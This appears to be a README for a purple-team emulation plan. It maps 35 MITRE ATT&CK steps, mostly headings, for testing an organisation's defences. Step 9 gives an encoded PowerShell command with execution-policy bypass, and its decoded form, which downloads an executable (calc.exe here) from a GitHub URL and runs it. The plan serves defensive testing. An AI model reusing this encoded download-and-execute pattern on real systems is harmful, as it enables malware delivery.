

Use the spreadsheet to lead the purple team exercise. 
By default the spreadsheet offers 2 lines to document security controls. If you have identified (pre or post execution) more than 2 security controls, just add a new line and document as usual (I mean Excel stuff...).

I tried as much as possible to avoid using C2
So you might enrich this emulation plan with a bit more C2 flavors to make it more realistic.
However this is a very good start for any organization to test their defenses against typical TTPs. And it doesn't require a strong mature red team infra.

Here is the list of steps in a more readable format with added comments.


### Step 1 - Reconnaissance: n/a

Not covered

### Step 2 - Resource Development: T1608.006 Stage Capabilities: SEO Poisoning

Not covered but most software recently SEO-poisoned could be found here:
https://github.com/Sam0x90/CTI/blob/main/ATT%26CK/Techniques/T1608_Stage_Capabilities/T1608.006_SEO_Poisoning/SEO_poisoned_software.txt

### Step 3 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0650 QakBot



### Step 4 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

### Step 5 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0483 IcedID

### Step 6 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

### Step 7 - Initial Access: T1566.002 Phishing: Spearphishing Link

### Step 8 - Execution: T1204.002 User Exectution: Malicious File

### Step 9 - Execution: T1059.001 Powershell
This LNK will run the following powershell command line:

```powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==```

This is the decoded command, which will download a legit Windows calc.exe from this repository before running it: 

```$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path```

### Step 10 - Execution/Discovery: T1059.001 Powershell & T1135 Network Share Discovery

### Step 11 - Execution/Discovery: T1059.001 Powershell

### Step 12 - Execution/Discovery: T1047 Windows Management Instrumentation & T1518 Software Discovery

### Step 13 - Execution/Discovery: T1047 Windows Management Instrumentation & T1082 System Information Discovery

### Step 14 - Execution/Persistence: T1047 Windows Management Instrumentation & T1546.003 Event Triggered Execution: WMI Event Subscription

### Step 15 - Execution/Lateral Movement: T1047 Windows Management Instrumentation & T1021.006 Remote Services: Windows Remote Management

### Step 16 - Persistence: T1053.005 Scheduled Task

### Step 17 - Persistence: T1547.001 Registry Run Keys / Stratup Folder

### Step 18 - Privilege Escalation/Defense Evasion: T1055.001 Process Injection: Dynamic-link Library Injection & S0154 Cobalt Strike

### Step 19 - Privilege Escalation/Defense Evasion: T1055.012 Process Injection: Process Hollowing

### Step 20 - Defense Evasion: T1218.010 System Binary Proxy Execution: Regsvr32

### Step 21 - Defense Evasion: T1218.011 System Binary Proxy Execution: Rundll32

### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne

### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS

### Step 24 - Credential Access: T1110.003 Brute force: Password Spraying

### Step 25 - Discovery: T1482 Domain Trust Discovery & T1018 Remote System Discovery & T1016 System Network Configuration Discovery & T1082 System Information Discovery

### Step 26 - Discovery: T1087.002 Account Discovery: Domain Account & T1018 Remote System Discovery & S0552 AdFind

### Step 27 - Lateral Movement: T1021.001 Remote Services: Remote Desktop Protocol

### Step 28 - Lateral Movement: T1021.002 Remote Services: SMB/Windows Admin Shares

### Step 29 - Lateral Movement: T1550.002 Use Alternate Authentication Material: Pass the Hash

### Step 30 - Collection: T1560.001 Archive Collected Data: Archive via Utility & S0160 certutil

### Step 31 - Command and Control: T1219 Remote Access Software

### Step 32 - Command and Control: T1071 Application Layer Protocol

### Step 33 - Exfiltration: T1567 Exfiltration Over Web Service: Exfiltration to Cloud Storage & S1040 Rclone

### Step 34 - Impact: T1490 Inhibit System Recovery

### Step 35 - Impact: T1490 Inhibit System Recovery


TO-DO:
- Scoring and/or reporting to evaluate/benchmark. 






